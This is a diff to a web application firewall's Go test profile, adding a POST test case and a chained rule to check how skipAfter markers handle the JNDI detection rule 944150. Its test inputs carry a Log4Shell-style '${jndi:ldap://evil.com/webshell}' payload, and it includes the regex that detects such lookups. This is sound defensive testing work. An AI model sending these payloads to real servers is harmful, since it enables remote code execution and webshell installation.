@@ -99,10 +99,27 @@ var _ = profile.RegisterProfile(profile.Profile{
 								"User-Agent":   "CRS 3 Tests ${jndi:ldap://evil.com/webshell}"},
 						},
 						Output: profile.ExpectedOutput{
-							TriggeredRules: []int{900001},
+							TriggeredRules: []int{900001, 911011, 911012},
 							// Placing skipAfter rules the earliest possible and for each phase permits to properly skip the rules.
 							// 944150 should have been triggered at phase 1 but it is skipped thanks to skipAfter.
-							NonTriggeredRules: []int{944150},
+							NonTriggeredRules: []int{944150, 100},
+						},
+					},
+				},
+				{
+					Stage: profile.SubStage{
+						Input: profile.StageInput{
+							URI:    "/",
+							Method: "POST",
+							Headers: map[string]string{
+								"Content-Type": "application/x-www-form-urlencoded"},
+							Data: "${jndi:ldap://evil.com/webshell}",
+						},
+						Output: profile.ExpectedOutput{
+							TriggeredRules: []int{900001, 911011, 911012},
+							// Placing skipAfter rules the earliest possible and for each phase permits to properly skip the rules.
+							// 944150 should have been triggered at phase 1 but it is skipped thanks to skipAfter.
+							NonTriggeredRules: []int{944150, 100},
 						},
 					},
 				},
@@ -120,6 +137,9 @@ SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:911012,phase:2,pass,nolog,skipAf
 
 SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|XML:/*|XML://@* "@rx (?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)" \
     "id:944150, phase:2, deny, status:503"
+
+SecRule REQUEST_URI "/" "id:100, phase:2, t:none, pass, log, chain"
+	SecRule REQUEST_URI "@unconditionalMatch" "t:none"
 
 SecMarker "END-REQUEST"
 `,
